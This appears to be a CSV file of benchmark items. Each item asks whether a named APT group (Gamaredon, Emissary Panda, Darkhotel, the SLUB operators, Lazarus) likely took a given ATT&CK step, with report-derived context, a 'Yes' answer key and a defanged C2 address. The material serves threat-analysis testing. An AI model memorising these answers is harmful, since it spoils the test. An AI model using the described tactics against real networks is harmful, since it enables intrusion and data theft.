1027,230,230-Collection-T1113-Screen Capture,"After using their backdoors to automatically list interesting files on a system for future exfiltration, is it likely that Gamaredon will use malware to take screenshots every minute before employing HTTP and HTTPS for command and control?","Collection: Gamaredon's malware searches for sensitive documents on the local system and scans all drives, including removable drives and network shares mounted as drives, for sensitive data. They also have a backdoor that takes screenshots every minute and deploy scripts that automatically scan for interesting documents.","Initial Access: The Gamaredon group initiates attacks by sending spearphishing emails with malicious attachments to targets, leveraging trusted relationships by abusing compromised organization's email accounts to send emails with malicious attachments to the victim's contacts.
Execution: Gamaredon employs scripting, mostly Batch files and VBScript, and uses rundll32 to launch malicious DLLs, such as the C/C++ backdoor. They also use CreateProcess to launch additional components, like executing payloads from C&C servers, and rely on user execution of malicious email attachments for initial compromise.
Persistence: The group registers several modules as scheduled tasks for persistence and uses Registry Run keys and the Startup folder to ensure modules execute at every reboot. They also insert malicious macros into existing documents, providing persistence when they are reopened.
Defense Evasion: Gamaredon uses obfuscated files or information, modifies registry keys to deactivate security mechanisms in Microsoft Office related to macros, and employs code signing with valid certificates. They also deobfuscate and decrypt strings in their modules and add remote templates to documents sent to targets. The C# compiler module contains an obfuscated downloader that is compiled using csc.exe and then executed.
Discovery: The group's backdoors automatically list interesting files, such as Office documents, found on a system for future exfiltration.
Lateral Movement: Gamaredon injects malicious macros into all Word and Excel documents reachable by the compromised system and uses its Outlook VBA macro to send email with malicious attachments to other targets within the same organization.
Command and Control: The group's malware uses both HTTP and HTTPS for command and control.
Exfiltration: Gamaredon's modules automatically upload harvested documents to the C&C server.
Others: The Gamaredon group has been active since at least 2013, mostly targeting Ukrainian institutions. They have increased activity in recent months with constant waves of malicious emails. The group uses a variety of programming languages and simple tools designed to gather sensitive information and spread further. They do not seem to make efforts to stay under the radar, focusing on spreading quickly and exfiltrating data. The group uses many different domains for C&C servers, both free and paid, and changes them frequently. They also use separate domains for small groups of victims. Despite errors in their tools, the group's rapid execution and adaptation create a state of constant dread in their targets. Persistence techniques include scheduled tasks, autorun registry keys, and leveraging the Startup folder. The group's strategy of installing multiple scripts and executables on each system and constantly updating them complicates defenders' efforts.",Yes,Gamaredon group grows its game _ WeLiveSecurity
1028,230,230-Collection-T1119-Automated Collection,"After Gamaredon uses its Outlook VBA macro for lateral movement by sending emails with malicious attachments to other targets, is it likely that the group will deploy scripts to automatically scan for sensitive documents as part of their collection activities?","Collection: Gamaredon's malware searches for sensitive documents on the local system and scans all drives, including removable drives and network shares mounted as drives, for sensitive data. They also have a backdoor that takes screenshots every minute and deploy scripts that automatically scan for interesting documents.","Initial Access: The Gamaredon group initiates attacks by sending spearphishing emails with malicious attachments to targets, leveraging trusted relationships by abusing compromised organization's email accounts to send emails with malicious attachments to the victim's contacts.
Execution: Gamaredon employs scripting, mostly Batch files and VBScript, and uses rundll32 to launch malicious DLLs, such as the C/C++ backdoor. They also use CreateProcess to launch additional components, like executing payloads from C&C servers, and rely on user execution of malicious email attachments for initial compromise.
Persistence: The group registers several modules as scheduled tasks for persistence and uses Registry Run keys and the Startup folder to ensure modules execute at every reboot. They also insert malicious macros into existing documents, providing persistence when they are reopened.
Defense Evasion: Gamaredon uses obfuscated files or information, modifies registry keys to deactivate security mechanisms in Microsoft Office related to macros, and employs code signing with valid certificates. They also deobfuscate and decrypt strings in their modules and add remote templates to documents sent to targets. The C# compiler module contains an obfuscated downloader that is compiled using csc.exe and then executed.
Discovery: The group's backdoors automatically list interesting files, such as Office documents, found on a system for future exfiltration.
Lateral Movement: Gamaredon injects malicious macros into all Word and Excel documents reachable by the compromised system and uses its Outlook VBA macro to send email with malicious attachments to other targets within the same organization.
Command and Control: The group's malware uses both HTTP and HTTPS for command and control.
Exfiltration: Gamaredon's modules automatically upload harvested documents to the C&C server.
Others: The Gamaredon group has been active since at least 2013, mostly targeting Ukrainian institutions. They have increased activity in recent months with constant waves of malicious emails. The group uses a variety of programming languages and simple tools designed to gather sensitive information and spread further. They do not seem to make efforts to stay under the radar, focusing on spreading quickly and exfiltrating data. The group uses many different domains for C&C servers, both free and paid, and changes them frequently. They also use separate domains for small groups of victims. Despite errors in their tools, the group's rapid execution and adaptation create a state of constant dread in their targets. Persistence techniques include scheduled tasks, autorun registry keys, and leveraging the Startup folder. The group's strategy of installing multiple scripts and executables on each system and constantly updating them complicates defenders' efforts.",Yes,Gamaredon group grows its game _ WeLiveSecurity
1029,230,230-Exfiltration-T1041-Exfiltration Over C2 Channel,"After deploying their malware to search for sensitive documents and take screenshots during the collection phase, is it likely that Gamaredon's modules will automatically upload harvested documents to the C&C server during the exfiltration phase?",Exfiltration: Gamaredon's modules automatically upload harvested documents to the C&C server.,"Initial Access: The Gamaredon group initiates attacks by sending spearphishing emails with malicious attachments to targets, leveraging trusted relationships by abusing compromised organization's email accounts to send emails with malicious attachments to the victim's contacts.
Execution: Gamaredon employs scripting, mostly Batch files and VBScript, and uses rundll32 to launch malicious DLLs, such as the C/C++ backdoor. They also use CreateProcess to launch additional components, like executing payloads from C&C servers, and rely on user execution of malicious email attachments for initial compromise.
Persistence: The group registers several modules as scheduled tasks for persistence and uses Registry Run keys and the Startup folder to ensure modules execute at every reboot. They also insert malicious macros into existing documents, providing persistence when they are reopened.
Defense Evasion: Gamaredon uses obfuscated files or information, modifies registry keys to deactivate security mechanisms in Microsoft Office related to macros, and employs code signing with valid certificates. They also deobfuscate and decrypt strings in their modules and add remote templates to documents sent to targets. The C# compiler module contains an obfuscated downloader that is compiled using csc.exe and then executed.
Discovery: The group's backdoors automatically list interesting files, such as Office documents, found on a system for future exfiltration.
Lateral Movement: Gamaredon injects malicious macros into all Word and Excel documents reachable by the compromised system and uses its Outlook VBA macro to send email with malicious attachments to other targets within the same organization.
Collection: Gamaredon's malware searches for sensitive documents on the local system and scans all drives, including removable drives and network shares mounted as drives, for sensitive data. They also have a backdoor that takes screenshots every minute and deploy scripts that automatically scan for interesting documents.
Command and Control: The group's malware uses both HTTP and HTTPS for command and control.
Others: The Gamaredon group has been active since at least 2013, mostly targeting Ukrainian institutions. They have increased activity in recent months with constant waves of malicious emails. The group uses a variety of programming languages and simple tools designed to gather sensitive information and spread further. They do not seem to make efforts to stay under the radar, focusing on spreading quickly and exfiltrating data. The group uses many different domains for C&C servers, both free and paid, and changes them frequently. They also use separate domains for small groups of victims. Despite errors in their tools, the group's rapid execution and adaptation create a state of constant dread in their targets. Persistence techniques include scheduled tasks, autorun registry keys, and leveraging the Startup folder. The group's strategy of installing multiple scripts and executables on each system and constantly updating them complicates defenders' efforts.",Yes,Gamaredon group grows its game _ WeLiveSecurity
1034,232,232-Reconnaissance-T1595-Active Scanning,"After Emissary Panda exploited the Microsoft SharePoint vulnerability (CVE-2019-0604) to gain initial access by installing webshells on SharePoint servers, is it likely that they uploaded a variety of tools and custom backdoors, such as HyperBro, to perform execution before scanning the network for subsequently vulnerable systems through tools targeting CVE-2017-0144?","Reconnaissance: In April 2019, Unit 42 observed Emissary Panda (APT27, TG-3390, Bronze Union, Lucky Mouse) exploiting a vulnerability in Microsoft SharePoint (CVE-2019-0604) to install webshells on SharePoint servers of Middle East Government Organizations. They used tools to identify systems vulnerable to CVE-2017-0144, the same exploited by EternalBlue in the WannaCry attacks.","Initial Access: Emissary Panda gained initial access by exploiting a vulnerability in Microsoft SharePoint (CVE-2019-0604) to install webshells on servers. This activity was first observed on April 1, 2019, and continued until April 16, 2019.
Execution: The threat actors uploaded a variety of tools to the compromised servers, including legitimate applications and post-exploitation tools like Mimikatz. They also uploaded custom backdoors such as HyperBro, commonly associated with Emissary Panda.
Persistence: The actors installed webshells on SharePoint servers for persistence. These included the Antak webshell, a variant of the China Chopper webshell, and other related webshells like stylecs.aspx, stylecss.aspx, and test.aspx.
Defense Evasion: Emissary Panda used webshells to upload legitimate executables for DLL sideloading, running malicious DLLs with code overlaps with known Emissary Panda attacks. They also used the China Chopper webshell to maintain access and evade defenses.
Credential Access: The actors used tools like Mimikatz to dump credentials, which were then used to pivot to additional systems within the network.
Discovery: The threat group used tools to perform network reconnaissance, identifying vulnerable systems and gathering information to facilitate lateral movement.
Lateral Movement: Emissary Panda moved laterally across the network using stolen credentials and exploiting vulnerabilities, particularly CVE-2017-0144 (EternalBlue).
Command and Control: The HyperBro backdoor was used for command and control, configured to communicate with a C2 server over HTTPS (hxxps://185.12.45[.]134:443/ajax).
Others: The CTI report includes indicators of compromise (IoCs) and SHA256 hashes of the webshells and malicious tools used by Emissary Panda. Additionally, the report correlates findings with advisories from the Saudi Arabian National Cyber Security Center and the Canadian Center for Cyber Security.",Yes,Emissary Panda Attacks Middle East Government Sharepoint Servers
1042,232,232-Credential Access-T1003-OS Credential Dumping,"After performing network reconnaissance to identify vulnerable systems, is it likely that Emissary Panda exploited a vulnerability in Microsoft SharePoint (CVE-2019-0604) to install webshells before using Mimikatz to dump credentials for further network access?","Credential Access: The actors used tools like Mimikatz to dump credentials, which were then used to pivot to additional systems within the network.","Reconnaissance: In April 2019, Unit 42 observed Emissary Panda (APT27, TG-3390, Bronze Union, Lucky Mouse) exploiting a vulnerability in Microsoft SharePoint (CVE-2019-0604) to install webshells on SharePoint servers of Middle East Government Organizations. They used tools to identify systems vulnerable to CVE-2017-0144, the same exploited by EternalBlue in the WannaCry attacks.
Initial Access: Emissary Panda gained initial access by exploiting a vulnerability in Microsoft SharePoint (CVE-2019-0604) to install webshells on servers. This activity was first observed on April 1, 2019, and continued until April 16, 2019.
Execution: The threat actors uploaded a variety of tools to the compromised servers, including legitimate applications and post-exploitation tools like Mimikatz. They also uploaded custom backdoors such as HyperBro, commonly associated with Emissary Panda.
Persistence: The actors installed webshells on SharePoint servers for persistence. These included the Antak webshell, a variant of the China Chopper webshell, and other related webshells like stylecs.aspx, stylecss.aspx, and test.aspx.
Defense Evasion: Emissary Panda used webshells to upload legitimate executables for DLL sideloading, running malicious DLLs with code overlaps with known Emissary Panda attacks. They also used the China Chopper webshell to maintain access and evade defenses.
Discovery: The threat group used tools to perform network reconnaissance, identifying vulnerable systems and gathering information to facilitate lateral movement.
Lateral Movement: Emissary Panda moved laterally across the network using stolen credentials and exploiting vulnerabilities, particularly CVE-2017-0144 (EternalBlue).
Command and Control: The HyperBro backdoor was used for command and control, configured to communicate with a C2 server over HTTPS (hxxps://185.12.45[.]134:443/ajax).
Others: The CTI report includes indicators of compromise (IoCs) and SHA256 hashes of the webshells and malicious tools used by Emissary Panda. Additionally, the report correlates findings with advisories from the Saudi Arabian National Cyber Security Center and the Canadian Center for Cyber Security.",Yes,Emissary Panda Attacks Middle East Government Sharepoint Servers
1045,232,232-Lateral Movement-T1550-Use Alternate Authentication Material,"After using tools for network reconnaissance to identify vulnerable systems and gather information, is it likely that Emissary Panda used stolen credentials to perform lateral movement across the network before employing the HyperBro backdoor for command and control?","Lateral Movement: Emissary Panda moved laterally across the network using stolen credentials and exploiting vulnerabilities, particularly CVE-2017-0144 (EternalBlue).","Reconnaissance: In April 2019, Unit 42 observed Emissary Panda (APT27, TG-3390, Bronze Union, Lucky Mouse) exploiting a vulnerability in Microsoft SharePoint (CVE-2019-0604) to install webshells on SharePoint servers of Middle East Government Organizations. They used tools to identify systems vulnerable to CVE-2017-0144, the same exploited by EternalBlue in the WannaCry attacks.
Initial Access: Emissary Panda gained initial access by exploiting a vulnerability in Microsoft SharePoint (CVE-2019-0604) to install webshells on servers. This activity was first observed on April 1, 2019, and continued until April 16, 2019.
Execution: The threat actors uploaded a variety of tools to the compromised servers, including legitimate applications and post-exploitation tools like Mimikatz. They also uploaded custom backdoors such as HyperBro, commonly associated with Emissary Panda.
Persistence: The actors installed webshells on SharePoint servers for persistence. These included the Antak webshell, a variant of the China Chopper webshell, and other related webshells like stylecs.aspx, stylecss.aspx, and test.aspx.
Defense Evasion: Emissary Panda used webshells to upload legitimate executables for DLL sideloading, running malicious DLLs with code overlaps with known Emissary Panda attacks. They also used the China Chopper webshell to maintain access and evade defenses.
Credential Access: The actors used tools like Mimikatz to dump credentials, which were then used to pivot to additional systems within the network.
Discovery: The threat group used tools to perform network reconnaissance, identifying vulnerable systems and gathering information to facilitate lateral movement.
Command and Control: The HyperBro backdoor was used for command and control, configured to communicate with a C2 server over HTTPS (hxxps://185.12.45[.]134:443/ajax).
Others: The CTI report includes indicators of compromise (IoCs) and SHA256 hashes of the webshells and malicious tools used by Emissary Panda. Additionally, the report correlates findings with advisories from the Saudi Arabian National Cyber Security Center and the Canadian Center for Cyber Security.",Yes,Emissary Panda Attacks Middle East Government Sharepoint Servers
1047,232,232-Command and Control-T1071-Application Layer Protocol,"After Emissary Panda exploited a vulnerability in Microsoft SharePoint to install webshells for persistence, is it likely that they performed lateral movement using stolen credentials and the EternalBlue exploit before using the HyperBro backdoor to communicate with a C2 server over HTTPS?","Command and Control: The HyperBro backdoor was used for command and control, configured to communicate with a C2 server over HTTPS (hxxps://185.12.45[.]134:443/ajax).","Reconnaissance: In April 2019, Unit 42 observed Emissary Panda (APT27, TG-3390, Bronze Union, Lucky Mouse) exploiting a vulnerability in Microsoft SharePoint (CVE-2019-0604) to install webshells on SharePoint servers of Middle East Government Organizations. They used tools to identify systems vulnerable to CVE-2017-0144, the same exploited by EternalBlue in the WannaCry attacks.
Initial Access: Emissary Panda gained initial access by exploiting a vulnerability in Microsoft SharePoint (CVE-2019-0604) to install webshells on servers. This activity was first observed on April 1, 2019, and continued until April 16, 2019.
Execution: The threat actors uploaded a variety of tools to the compromised servers, including legitimate applications and post-exploitation tools like Mimikatz. They also uploaded custom backdoors such as HyperBro, commonly associated with Emissary Panda.
Persistence: The actors installed webshells on SharePoint servers for persistence. These included the Antak webshell, a variant of the China Chopper webshell, and other related webshells like stylecs.aspx, stylecss.aspx, and test.aspx.
Defense Evasion: Emissary Panda used webshells to upload legitimate executables for DLL sideloading, running malicious DLLs with code overlaps with known Emissary Panda attacks. They also used the China Chopper webshell to maintain access and evade defenses.
Credential Access: The actors used tools like Mimikatz to dump credentials, which were then used to pivot to additional systems within the network.
Discovery: The threat group used tools to perform network reconnaissance, identifying vulnerable systems and gathering information to facilitate lateral movement.
Lateral Movement: Emissary Panda moved laterally across the network using stolen credentials and exploiting vulnerabilities, particularly CVE-2017-0144 (EternalBlue).
Others: The CTI report includes indicators of compromise (IoCs) and SHA256 hashes of the webshells and malicious tools used by Emissary Panda. Additionally, the report correlates findings with advisories from the Saudi Arabian National Cyber Security Center and the Canadian Center for Cyber Security.",Yes,Emissary Panda Attacks Middle East Government Sharepoint Servers
1049,233,233-Execution-T1203-Exploitation for Client Execution,"After seeding Japanese P2P sharing sites with malware downloaded thousands of times for initial access, is Darkhotel APT likely to use 0-day exploits targeting Adobe products and Microsoft Internet Explorer to execute malicious code before maintaining persistence through malware that adds autorun registry settings?","Execution: The Darkhotel APT deploys various malware components that execute on victims' systems. These include small downloaders, information stealers, and advanced keyloggers. They also use 0-day exploits targeting Adobe products and Microsoft Internet Explorer to execute malicious code.","Reconnaissance: The Darkhotel APT, also known as Tapaoux, has been observed to target specific hotel and business center Wi-Fi networks to compromise guests' devices. They appear to have knowledge of their victims' whereabouts, including names and places of stay, suggesting advanced reconnaissance capabilities.
Resource Development: The Darkhotel APT has demonstrated the ability to compromise trusted commercial network resources on a global scale with strategic precision for years. They possess advanced mathematical and crypto-analytical offensive capabilities, allowing them to undermine the trust extended to Certificate Authorities and the PKI. They also maintain a larger, dynamic infrastructure built of Apache webservers, dynamic DNS records, crypto libraries, and PHP webapps.
Initial Access: The Darkhotel APT gains initial access by targeting hotel guests with malware posing as legitimate software updates for popular packages such as Google Toolbar, Adobe Flash, and Windows Messenger. They also seed Japanese P2P sharing sites with their malware, which is downloaded over 30,000 times in less than six months.
Persistence: The Darkhotel APT maintains persistence on compromised systems through the use of malware that adds autorun registry settings for automatic start during system boot. They also employ a selective infector virus to infiltrate other computers via USB or network shares.
Defense Evasion: The Darkhotel APT uses digital certificates to sign their backdoors, some of which require advanced mathematical capabilities to factorize the keys. They also employ techniques to encrypt and store gathered data in log files, using algorithms similar to RC4.
Credential Access: The Darkhotel APT's information stealer module targets stored secrets in Internet Explorer, Firefox, Chrome, and various email services. It is designed to terminate itself on Windows systems with the default codepage set to Korean.
Collection: The Darkhotel APT's keylogger module encrypts and stores gathered data in log files. The information stealer module collects various secrets stored on local systems, including cached passwords and credentials from multiple browsers and email services.
Command and Control: The Darkhotel APT maintains a web interface for victim management, listing and sorting victim systems according to their latest C2 check-in. They encrypt victim data on their servers with single user/passkey combinations across multiple victims.
Others: The Darkhotel APT has been active for almost a decade and is known for its successful attacks against a wide range of victims worldwide. They have used both targeted and botnet-style campaigns, indicating a strong threat actor with sophisticated espionage tools. The APT's targeting of top executives during their stay at certain hotels is particularly notable, as it suggests the attackers have detailed knowledge of their victims' travel plans.",Yes,darkhotel_kl_07.11
1053,233,233-Persistence-T1547-Boot or Logon Autostart Execution,"After deploying malware components such as small downloaders, information stealers, and advanced keyloggers to execute on victims' systems, is it likely that the Darkhotel APT will maintain persistence on compromised systems using autorun registry settings and malware?",Persistence: The Darkhotel APT maintains persistence on compromised systems through the use of malware that adds autorun registry settings for automatic start during system boot. They also employ a selective infector virus to infiltrate other computers via USB or network shares.,"Reconnaissance: The Darkhotel APT, also known as Tapaoux, has been observed to target specific hotel and business center Wi-Fi networks to compromise guests' devices. They appear to have knowledge of their victims' whereabouts, including names and places of stay, suggesting advanced reconnaissance capabilities.
Resource Development: The Darkhotel APT has demonstrated the ability to compromise trusted commercial network resources on a global scale with strategic precision for years. They possess advanced mathematical and crypto-analytical offensive capabilities, allowing them to undermine the trust extended to Certificate Authorities and the PKI. They also maintain a larger, dynamic infrastructure built of Apache webservers, dynamic DNS records, crypto libraries, and PHP webapps.
Initial Access: The Darkhotel APT gains initial access by targeting hotel guests with malware posing as legitimate software updates for popular packages such as Google Toolbar, Adobe Flash, and Windows Messenger. They also seed Japanese P2P sharing sites with their malware, which is downloaded over 30,000 times in less than six months.
Execution: The Darkhotel APT deploys various malware components that execute on victims' systems. These include small downloaders, information stealers, and advanced keyloggers. They also use 0-day exploits targeting Adobe products and Microsoft Internet Explorer to execute malicious code.
Defense Evasion: The Darkhotel APT uses digital certificates to sign their backdoors, some of which require advanced mathematical capabilities to factorize the keys. They also employ techniques to encrypt and store gathered data in log files, using algorithms similar to RC4.
Credential Access: The Darkhotel APT's information stealer module targets stored secrets in Internet Explorer, Firefox, Chrome, and various email services. It is designed to terminate itself on Windows systems with the default codepage set to Korean.
Collection: The Darkhotel APT's keylogger module encrypts and stores gathered data in log files. The information stealer module collects various secrets stored on local systems, including cached passwords and credentials from multiple browsers and email services.
Command and Control: The Darkhotel APT maintains a web interface for victim management, listing and sorting victim systems according to their latest C2 check-in. They encrypt victim data on their servers with single user/passkey combinations across multiple victims.
Others: The Darkhotel APT has been active for almost a decade and is known for its successful attacks against a wide range of victims worldwide. They have used both targeted and botnet-style campaigns, indicating a strong threat actor with sophisticated espionage tools. The APT's targeting of top executives during their stay at certain hotels is particularly notable, as it suggests the attackers have detailed knowledge of their victims' travel plans.",Yes,darkhotel_kl_07.11
1054,233,233-Collection-T1056-Input Capture,"After gaining victim credentials using the information stealer module to target stored secrets in browsers and email services, is The Darkhotel APT likely to deploy their keylogger module for input capture to encrypt and store gathered data in log files?","Collection: The Darkhotel APT's keylogger module encrypts and stores gathered data in log files. The information stealer module collects various secrets stored on local systems, including cached passwords and credentials from multiple browsers and email services.","Reconnaissance: The Darkhotel APT, also known as Tapaoux, has been observed to target specific hotel and business center Wi-Fi networks to compromise guests' devices. They appear to have knowledge of their victims' whereabouts, including names and places of stay, suggesting advanced reconnaissance capabilities.
Resource Development: The Darkhotel APT has demonstrated the ability to compromise trusted commercial network resources on a global scale with strategic precision for years. They possess advanced mathematical and crypto-analytical offensive capabilities, allowing them to undermine the trust extended to Certificate Authorities and the PKI. They also maintain a larger, dynamic infrastructure built of Apache webservers, dynamic DNS records, crypto libraries, and PHP webapps.
Initial Access: The Darkhotel APT gains initial access by targeting hotel guests with malware posing as legitimate software updates for popular packages such as Google Toolbar, Adobe Flash, and Windows Messenger. They also seed Japanese P2P sharing sites with their malware, which is downloaded over 30,000 times in less than six months.
Execution: The Darkhotel APT deploys various malware components that execute on victims' systems. These include small downloaders, information stealers, and advanced keyloggers. They also use 0-day exploits targeting Adobe products and Microsoft Internet Explorer to execute malicious code.
Persistence: The Darkhotel APT maintains persistence on compromised systems through the use of malware that adds autorun registry settings for automatic start during system boot. They also employ a selective infector virus to infiltrate other computers via USB or network shares.
Defense Evasion: The Darkhotel APT uses digital certificates to sign their backdoors, some of which require advanced mathematical capabilities to factorize the keys. They also employ techniques to encrypt and store gathered data in log files, using algorithms similar to RC4.
Credential Access: The Darkhotel APT's information stealer module targets stored secrets in Internet Explorer, Firefox, Chrome, and various email services. It is designed to terminate itself on Windows systems with the default codepage set to Korean.
Command and Control: The Darkhotel APT maintains a web interface for victim management, listing and sorting victim systems according to their latest C2 check-in. They encrypt victim data on their servers with single user/passkey combinations across multiple victims.
Others: The Darkhotel APT has been active for almost a decade and is known for its successful attacks against a wide range of victims worldwide. They have used both targeted and botnet-style campaigns, indicating a strong threat actor with sophisticated espionage tools. The APT's targeting of top executives during their stay at certain hotels is particularly notable, as it suggests the attackers have detailed knowledge of their victims' travel plans.",Yes,darkhotel_kl_07.11
1070,235,235-Discovery-T1113-Screen Capture,"After implementing checks for security software during malware deployment to evade detection, is it likely that the attackers will execute a series of commands to collect system information and capture screenshots from infected machines under the SLUB variant before exfiltrating this information to the Mattermost server?","Discovery: The SLUB variant used in the campaign interacted with a Mattermost server to collect information about the infected machines. It executed a series of commands to exfiltrate system information and captured screenshots, which were then sent back to the attacker-controlled Mattermost server.","Initial Access: The campaign, dubbed Operation Earth Kitsune, utilized watering hole tactics to compromise websites related to North Korea, targeting international associations. The attackers injected exploits for CVE-2020-0674 and CVE-2019-5782 into these websites to facilitate the delivery of malware. The campaign specifically avoided South Korean IP addresses, indicating a focus on the global Korean diaspora.
Execution: The Chrome exploit vector involved chaining two patched vulnerabilities, CVE-2019-5782 and an unnamed Chrome bug, to execute custom shellcode. This shellcode de-obfuscated strings, initialized a network connection, and downloaded a payload named 'dropper.dll' from a C&C server. The dropper.dll then checked for security software presence and, if none were detected, downloaded and executed three additional malware samples. An Internet Explorer exploit vector using CVE-2020-0674 was also employed, which ran a PowerShell loader to infect victims with the same three malware variants.
Privilege Escalation: The PowerShell loader used in the Internet Explorer exploit vector could instruct the download and execution of an LPE binary exploiting CVE-2019-1458, potentially allowing the backdoors to execute with system privileges.
Defense Evasion: The attackers implemented checks for security software during malware deployment to avoid detection. If any security software from a predefined list was detected, the malware would abort execution. This indicates an effort to target unprotected systems and remain stealthy.
Command and Control: The SLUB malware variant communicated with a Mattermost server using HTTP on port 443. It created individual channels for each infected machine and used a notification channel for real-time updates on new infections. The Mattermost server hosted multiple channels and users, indicating an organized campaign with different attack vectors.
Exfiltration: The SLUB malware variant exfiltrated a significant amount of system information from infected machines to the Mattermost server. This included executing commands to gather system details and capturing screenshots.
Others: The campaign used GNUBOARD CMS on compromised websites, which had known RCE vulnerabilities. The attackers set up their own Mattermost server, which provided them control over the infrastructure and avoided the risk of having their operations disrupted by third-party services. The Mattermost server installation date of March 10, 2020, suggests the start of the 'mm' (SLUB) samples' activity. The campaign used multiple C&C servers, seven samples, and exploits for four N-day bugs, indicating a well-resourced and capable group behind the operation.",Yes,2020.10.19_-_Operation_Earth_Kitsune_-_Tracking_SLUBs_current_operations
1071,235,235-Exfiltration-T1567-Exfiltration Over Web Service,"After SLUB malware collects system information and captures screenshots during its interaction with a Mattermost server under the Discovery phase, is it likely that the malware will subsequently exfiltrate system information and screenshots via the same Mattermost server as part of the Exfiltration phase?",Exfiltration: The SLUB malware variant exfiltrated a significant amount of system information from infected machines to the Mattermost server. This included executing commands to gather system details and capturing screenshots.,"Initial Access: The campaign, dubbed Operation Earth Kitsune, utilized watering hole tactics to compromise websites related to North Korea, targeting international associations. The attackers injected exploits for CVE-2020-0674 and CVE-2019-5782 into these websites to facilitate the delivery of malware. The campaign specifically avoided South Korean IP addresses, indicating a focus on the global Korean diaspora.
Execution: The Chrome exploit vector involved chaining two patched vulnerabilities, CVE-2019-5782 and an unnamed Chrome bug, to execute custom shellcode. This shellcode de-obfuscated strings, initialized a network connection, and downloaded a payload named 'dropper.dll' from a C&C server. The dropper.dll then checked for security software presence and, if none were detected, downloaded and executed three additional malware samples. An Internet Explorer exploit vector using CVE-2020-0674 was also employed, which ran a PowerShell loader to infect victims with the same three malware variants.
Privilege Escalation: The PowerShell loader used in the Internet Explorer exploit vector could instruct the download and execution of an LPE binary exploiting CVE-2019-1458, potentially allowing the backdoors to execute with system privileges.
Defense Evasion: The attackers implemented checks for security software during malware deployment to avoid detection. If any security software from a predefined list was detected, the malware would abort execution. This indicates an effort to target unprotected systems and remain stealthy.
Discovery: The SLUB variant used in the campaign interacted with a Mattermost server to collect information about the infected machines. It executed a series of commands to exfiltrate system information and captured screenshots, which were then sent back to the attacker-controlled Mattermost server.
Command and Control: The SLUB malware variant communicated with a Mattermost server using HTTP on port 443. It created individual channels for each infected machine and used a notification channel for real-time updates on new infections. The Mattermost server hosted multiple channels and users, indicating an organized campaign with different attack vectors.
Others: The campaign used GNUBOARD CMS on compromised websites, which had known RCE vulnerabilities. The attackers set up their own Mattermost server, which provided them control over the infrastructure and avoided the risk of having their operations disrupted by third-party services. The Mattermost server installation date of March 10, 2020, suggests the start of the 'mm' (SLUB) samples' activity. The campaign used multiple C&C servers, seven samples, and exploits for four N-day bugs, indicating a well-resourced and capable group behind the operation.",Yes,2020.10.19_-_Operation_Earth_Kitsune_-_Tracking_SLUBs_current_operations
1073,235,235-Privilege Escalation-T1548-Abuse Elevation Control Mechanism,"After initial access is achieved through watering hole tactics exploiting CVE-2020-0674 and CVE-2019-5782, followed by execution of custom shellcode to download and run a PowerShell loader, is it likely that the attackers will use the PowerShell loader to execute backdoors with system privileges for privilege escalation?","Privilege Escalation: The PowerShell loader used in the Internet Explorer exploit vector could instruct the download and execution of an LPE binary exploiting CVE-2019-1458, potentially allowing the backdoors to execute with system privileges.","Initial Access: The campaign, dubbed Operation Earth Kitsune, utilized watering hole tactics to compromise websites related to North Korea, targeting international associations. The attackers injected exploits for CVE-2020-0674 and CVE-2019-5782 into these websites to facilitate the delivery of malware. The campaign specifically avoided South Korean IP addresses, indicating a focus on the global Korean diaspora.
Execution: The Chrome exploit vector involved chaining two patched vulnerabilities, CVE-2019-5782 and an unnamed Chrome bug, to execute custom shellcode. This shellcode de-obfuscated strings, initialized a network connection, and downloaded a payload named 'dropper.dll' from a C&C server. The dropper.dll then checked for security software presence and, if none were detected, downloaded and executed three additional malware samples. An Internet Explorer exploit vector using CVE-2020-0674 was also employed, which ran a PowerShell loader to infect victims with the same three malware variants.
Defense Evasion: The attackers implemented checks for security software during malware deployment to avoid detection. If any security software from a predefined list was detected, the malware would abort execution. This indicates an effort to target unprotected systems and remain stealthy.
Discovery: The SLUB variant used in the campaign interacted with a Mattermost server to collect information about the infected machines. It executed a series of commands to exfiltrate system information and captured screenshots, which were then sent back to the attacker-controlled Mattermost server.
Command and Control: The SLUB malware variant communicated with a Mattermost server using HTTP on port 443. It created individual channels for each infected machine and used a notification channel for real-time updates on new infections. The Mattermost server hosted multiple channels and users, indicating an organized campaign with different attack vectors.
Exfiltration: The SLUB malware variant exfiltrated a significant amount of system information from infected machines to the Mattermost server. This included executing commands to gather system details and capturing screenshots.
Others: The campaign used GNUBOARD CMS on compromised websites, which had known RCE vulnerabilities. The attackers set up their own Mattermost server, which provided them control over the infrastructure and avoided the risk of having their operations disrupted by third-party services. The Mattermost server installation date of March 10, 2020, suggests the start of the 'mm' (SLUB) samples' activity. The campaign used multiple C&C servers, seven samples, and exploits for four N-day bugs, indicating a well-resourced and capable group behind the operation.",Yes,2020.10.19_-_Operation_Earth_Kitsune_-_Tracking_SLUBs_current_operations
1081,236,236-Lateral Movement-T1550-Use Alternate Authentication Material,"After the Lazarus Group collected information about users, network settings, and processes using utilities like net user and tasklist.exe for discovery, is it likely that they used compromised legitimate privileged accounts for lateral movement on the network?",Lateral Movement: The group used compromised legitimate privileged accounts to move laterally on the network and their own data encryption algorithm to communicate with the C2 servers.,"Reconnaissance: In September 2020, the Lazarus Group initiated a cyber attack on a large pharmaceutical company. The attack began with the delivery of malicious documents containing job offers to company employees. These documents, once opened, activated malicious macros on the victims' home computers. The attackers used system utilities like ipconfig.exe, ping.exe, and net.exe for reconnaissance, as well as unknown PE files. The backdoor named CommsCacher and its configuration file encrypted with the VEST algorithm were used to monitor RDP sessions on the compromised computer. The attackers attempted to connect to the domain forecareer[.]com, which was registered shortly before the attack and mimicked the official website of General Dynamics Mission Systems.
Initial Access: The initial access to the pharmaceutical company's network was achieved when employees opened malicious documents sent to them, which contained job offers. These documents were named GD2020090939393903.doc and GD20200909GAB31.doc. The attack vectors included LinkedIn, Telegram, WhatsApp, and corporate email. The documents activated malicious macros on the victims' home computers.
Execution: The Lazarus Group executed malicious code using system utilities and a backdoor named CommsCacher. They also used the Windows command line to run commands and leveraged the legitimate SQLite DLL library with a malicious exported function sqlite3_create_functionex for execution.
Persistence: To maintain their foothold, the Lazarus Group created services using the sc.exe utility and local administrator accounts. They also placed shortcuts in the startup folder for persistence.
Privilege Escalation: The Lazarus Group escalated privileges by creating local administrator accounts and manipulating system processes and services.
Defense Evasion: The group used various techniques to evade detection, including encrypting configuration files with the VEST algorithm, hiding malware in hidden folders at C:\ProgramData, and removing malware samples from the file system. They also used rundll32.exe to launch a malicious DLL.
